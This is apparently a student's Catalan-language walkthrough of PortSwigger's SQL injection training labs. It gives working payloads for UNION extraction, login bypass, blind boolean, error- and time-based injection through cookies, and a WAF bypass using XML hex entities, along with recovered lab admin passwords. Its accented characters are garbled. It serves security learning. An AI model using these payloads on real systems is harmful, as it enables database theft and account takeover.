# SQLI LABS: https://portswigger.net/web-security/sql-injection
# CHEAT SHEET: https://portswigger.net/web-security/sql-injection/cheat-sheet

## **Lab 1**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    /filter?category=Gifts' or 1=1-- -'

## **Lab 2**: SQL injection vulnerability allowing login bypass

    administrator'-- -

## **Lab 3**: SQL injection UNION attack, determining the number of columns returned by the query

    filter?category=Gifts' union select NULL, NULL, NULL-- -
## **Lab 4**: SQL injection UNION attack, finding a column containing text

    filter?category=Gifts' union select NULL,'1M2wiY',NULL-- -

## **Lab 5**: SQL injection UNION attack, retrieving data from other tables
1. Llistar TOTES les Bases de Dades:
        
        filter?category=Gifts' union select schema_name,NULL from information_schema.schemata-- -
2. Llistar TOTES les Taules de totes les BBDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables-- -
3. Llistar TOTES les Taules d'1 BDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables where table_schema='public'-- -
4. Llistar TOTES les Columnes d'una taula i una BDD en concret:
        
        filter?category=Gifts' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users'-- -
5. Llistar Dades de diferents maneres
       
        a) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users-- -
        b) filter?category=Gifts' union select NULL,group_concat(username,0x3a,password) from users-- -
            ---> Convertim els : en Hexadecimal
        c) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = 'admin'-- -
        d) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = '0x61646d696e'-- -
            ---> Convertim la paraula 'admin' en Hexadecimal

        Convertir 'admin' en Hexadecimal ==> echo "admin" | tr -d '\n' | xxd -ps

        5.1. SOLVED: filter?category=Gifts' union select username,password from users-- -
        5.2. SOLVED: filter?category=Gifts' union select NULL,username||':'||password from users-- -
              - OUTPUT: administrator:ria9b2ri5pwga9fk2s41

## **Lab 6**: SQL injection UNION attack, retrieving multiple values in a single column

    filter?category=Gifts' union select NULL,username||':'||password from users-- -
            OUTPUT: administrator/lt7elzdb9kleb4bdfy9f

## **Lab 7**: SQL injection attack, querying the database type and version on Oracle
    filter?category=Gifts' union select NULL,banner from v$version-- -

## **Lab 8**: SQL injection attack, querying the database type and version on MySQL and Microsoft
    filter?category=Lifestyle' union select NULL,@@version-- -

## **Lab 9**: SQL injection attack, listing the database contents on non-Oracle databases
    a) filter?category=Accessories' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
	    OUTPUT: users_mozxmt, products
    b) filter?category=Accessories' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users_mozxmt'-- -
	    OUTPUT: password_imfrmo, username_blbbus
    c) filter?category=Accessories' union select username_blbbus,password_imfrmo from users_mozxmt-- -
	        OUTPUT: administrator/4osd4u3aeqkfxw5z3zvk

## **Lab 10**: SQL injection attack, listing the database contents on Oracle

    a) filter?category=Gifts' union select NULL,owner from all_tables-- -
	    OUTPUT: APEX_040000, CTXSYS, MDSYS, PETER, SYS, SYSTEM, XDB
    b) filter?category=Gifts' union select NULL,table_name from all_tables where owner = 'PETER'-- -
	    OUTPUT: products, USERS_IFEEJB
    c) filter?category=Gifts' union select NULL,column_name from all_tab_columns where table_name = 'USERS_IFEEJB'-- -
	    OUTPUT: PASSWORD_HHELXQ, USERNAME_QLKZDD
    d) filter?category=Gifts' union select NULL,USERNAME_QLKZDD||':'||PASSWORD_HHELXQ from USERS_IFEEJB-- -
	    OUTPUT: administrator/l5j55i07t8chg0l6j2jd

## **Lab 11**: Blind SQL injection with conditional responses

    Amb BurpSuite pillar la petici?? de la p??gina principal i la vulnerabilitat esta en canviar el valor de la Cookie.
    Ens hem de fixar en el text "Welcome Back!".
    Si surt, ??s perqu?? el nostre codi s'esta interpretant. Per?? no ens mostra el codi.
    Si NO surt, ??s perqu?? el nostre codi NO s'esta interpretant i hi ha algun error.

    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(username,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    Si enviem aquesta petici?? ens hauria de sortir "Welcome Back!", ja que si que existeix l'usuari admin.

    Ara escrivim:
    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    I enviarem aquesta petici?? a l'intruder.

    A l'intruder on posa "Choose an attack type" farem tipus 'Sniper'.
    Seleccionem la lletra "a" despr??s de l'administrator i a la dreta posem ADD??.
    La lletra a ens ha de quedar aixi: ??a??

    Ens dirigim a la pestanya de Payloads.
    I on posa Payload Options (Simple List)
    Anem afegint el nostre diccionari: a,b,c,d,e,f.. 1,2,3,4..
    Tots els caracters que volguem.
    A la dreta clickem StartAttack

    Comprovara que la primera lletra de la password de l'usuari administrator sigui aquella.
    Com que a la pagina ens mostra un "Welcome Back" si ha funcionat, ens haurem de fixar en la columna "length" de l'atac que acabem de fer.
    Veig que tots tenen 11030 i la "k" un 11091.

    Per tant, si en el Repeater li posem
    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='k; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
    Ens sortira el "Welcome Back!"
    Aix?? em diu que la primera lletra de la password ser?? "k".

    Ens creem un script en Python anomenat SQLI_Conditional_Responses.py

    Fem pip3 install pwntools

    Abans de continuar amb l'script, volem averiguar de quants caracters esta feta la passwd.
    Anem provant el numero fins que trobem que ??s de 20.
    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select 'a' from users where username='administrator' and length(password)>=20)='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    OUTPUT SCRIPT:
    python3 SQLI_Conditional_Responses.py
    [???] Fuerza Bruta: NQLIhBYeW4w1MyVo' and (select substring(password,20,1) from users where username='administrator')='m
    [???] Password: koa1z59sfl237dt7vmmm

## **Lab 12**: Blind SQL injection with conditional errors
    
    Aquest lab ??s bastant semblant a l'anterior. Tot i que en aquest cas no tindrem cap missatge com el de 'Welcome Back!', sin?? que ens haurem de guiar per 'status_code' (els 200 i els 500, concretament).

    Per sapiguer quina BBDD corre darrera, podem inserir el payload:
        - Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Fent aixo ens mostrara un Internal Server Error (500).
        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '' from dual)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Ens mostra la p??gina correctament (200).
        Oracle necessita SEMPRE una taula per ser llistada, per tant, estem sobre una BD d'Oracle.

    Per sapiguer si existeix alguna taula:
        - Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '' from users where rownum=1)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Aquest payload ens mostra un 200, ja que si que existeix la taula 'users'.

    Per sapiguer si existeix l'usuari 'administrator':
        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Les seq????ncies es llegeixen de dreta a esquerra. Com que l'username administrator existeix, passa al when. I com que 1=1 ??s cert, intenta fer 1/0. Aquesta operaci?? ??s erronia i per tant et dona un 500.
        Si canviem '1=1' a '2=1', com que aix?? no ??s correcte, no entra al 'then' i fa l'else, que b??sicament ??s com "continua". I per tant, ens dona un 200. Ara sabem que l'usuari 'administrator' existeix.
    
    Per sapiguer la llargada de la passwd:
        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when (2=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>=20)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Aix?? ens dona un 200. Si posem >=21, ens dona un 500. Per tant, sabem que la password t?? 20 caracters.
    
    Per sapiguer la password de l'usuari comen??em amb:
        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
        Com que el primer car??cter de l'user 'administrator' ??s 'a',, doncs fes la operaci?? 1/0. Com que no ??s possible, ens mostra un 500.
        Ara podem canviar el valor 'username' pel de 'password' i comen??ar a endevinar la password.
        Per fer-ho autom??ticament, he creat l'script "SQLI_Conditional_Errors.py"

    OUTPUT SCRIPT:
    python3 SQLI_Conditional_Errors.py
    [/] Fuerza Bruta: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when   substr(password,20,1)='l' then to_char(1/0) else '' end from users where username='administrator')||'
    [O] Password: fmic7lf2qnioxjuqbe2l
               
## **Lab 13**: Blind SQL injection with time delays
    Si a la Cookie li posem una ' o dues '', no s'ens mostra cap Server Internal Error. Podem provar de fer un sleep.
    MYSQL:
        Cookie: TrackingId=qaKF1WSyLRpktnlf' and sleep(5)-- ; session=SeDkzU5Sn7hIqzIZszwRyeDinYyQNy4C
        La web NO tarda 5 segons a responde.
    PostgreSQL:
        Cookie: TrackingId=qaKF1WSyLRpktnlf'||pg_sleep(10)-- -; session=SeDkzU5Sn7hIqzIZszwRyeDinYyQNy4C
        La web SI tarda 10 segons a responde.

## **Lab 14**: Blind SQL injection with time delays and information retrieval
    Per comprovar que l'usuari 'administrator' existeix i tenir la base del nostre payload:
        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
        Si tarda 5 segons, l'usuari existeix. Sin??, 0.    

    Per comprovar la longitud de la nostra password:
        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)>=20)-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
        Si la password t?? m??s o igual 20 car??cters, espera 5 segons, sin??, 0 segons. Si posem 21, veiem que tarda 0 segons.
    
    Per comen??ar amb el payload de la contrasenya, utilitzem el par??metre 'substring' com els anteriors labs.
        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when substring(username,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
        En aquest cas, ens tardar?? 5 segons a carregar la p??gina ja que el primer car??cter d'administrator ??s 'a'. Si posem, per exemple, 'b', tardar?? 0 segons.
    
    Per endevinar la password, farem la mateixa seq????ncia que l'anterior comanda per?? canviant 'username' per 'password'. Com que ho hem de repetir 20 cops, fem un script anomenat SQLI_Blind.py.

    OUTPUT SCRIPT:
     python3 SQLI_Blind.py             
    [???] Fuerza Bruta: gPRaGnb5ptpIFWij'||(select case when substring(password,20,1)='z' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')--
    [-] Password: c2fxff9rwefag2y4cvqz


## **Lab 15**: Blind SQL injection with out-of-band interaction

    NEED BurpSuite Collaborator Client (Pro Version) - Pagant ???
## **Lab 16**: Blind SQL injection with out-of-band data exfiltration

    NEED BurpSuite Collaborator Client (Pro Version) - Pagant ???

## **Lab 17**: SQL injection with filter bypass via XML encoding

    La vulnerabilitat est?? a la casella de "check stock"
    Amb el BurpSuit veiem:
    POST /product/stock HTTP/1.1

    Trobem aix??:
        <?xml version="1.0" encoding="UTF-8"?>
          <stockCheck>
            <productId>
            2
            </productId>
            <storeId>
            1
            </storeId>
          </stockCheck>

    Ens torna aix??:
    HTTP/1.1 200 OK
    481 units

    Provem:
    1 union SELECT NULL-- -
    Ens dona:
    "Attack detected"

    Ens donen un HINT dient que instal??lem el 'Hackvertor' del Burpsuit:
    Extender > BAppStore > Hackvertor > Install

    Tornem al Repeater, seleccionem el nostre payload "1 union SELECT NULL-- -", click dret i ens dirigim a 'extensions>hackvertor>Encode>hex_entities'

    Ara tindrem:
    <?xml version="1.0" encoding="UTF-8"?>
      <stockCheck>
        <productId>
        2
        </productId>
        <storeId>
         <@hex_entities>
         1 union SELECT NULL-- -
         <@/hex_entities>
        </storeId>
      </stockCheck>

    I si enviem la petici?? revem:
        HTTP/1.1 200 OK 
        481 units
        null

    Trobem la password:
    <@hex_entities>
         1 union select password from users where username='administrator'-- -
    <@/hex_entities>

    Resultat de la password:
    lw43pol3r4vo60eke0w2